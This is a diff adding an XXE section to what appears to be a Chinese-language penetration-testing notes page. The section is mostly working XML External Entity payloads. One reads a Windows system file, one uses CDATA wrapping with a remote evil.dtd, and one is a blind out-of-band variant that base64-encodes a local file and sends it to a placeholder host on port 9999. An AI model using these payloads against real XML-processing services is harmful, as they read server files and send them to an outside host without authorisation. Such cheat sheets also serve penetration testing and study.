@@ -489,6 +489,41 @@ vim she/secret
 
 -d 是发包间隔，秒为单位
 </code></pre>
+<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p><a href="https://xz.aliyun.com/t/3357">文章</a></p>
+<h2 id="有回显XXE"><a href="#有回显XXE" class="headerlink" title="有回显XXE"></a>有回显XXE</h2><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
+&lt;!DOCTYPE creds [  
+&lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt; 
+&lt;creds&gt;&amp;goodies;&lt;/creds&gt;
+</code></pre>
+<p>如果其中含有特殊字符，则需要CDATA拼接</p>
+<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
+&lt;!DOCTYPE roottag [
+&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   
+&lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;  
+&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  
+&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; 
+%dtd; ]&gt; 
+
+&lt;roottag&gt;&amp;all;&lt;/roottag&gt;
+</code></pre>
+<p>evil.dtd</p>
+<pre><code class="xml">
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; 
+&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;
+</code></pre>
+<p>无回显xxe</p>
+<p>test.dtd</p>
+<pre><code class="xml">
+&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;
+&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://ip:9999?p=%file;&#39;&gt;&quot;&gt;
+</code></pre>
+<p>payload</p>
+<pre><code class="xml">&lt;!DOCTYPE convert [ 
+&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;
+%remote;%int;%send;
+]&gt;
+</code></pre>
+<p>各xml处理支持的协议<br><img src="https://i0.hdslb.com/bfs/article/5a9838814ec36d7275acb8fa9e768dcb290349942.png"></p>
 
         </div>
         <!-- .entry-content -->
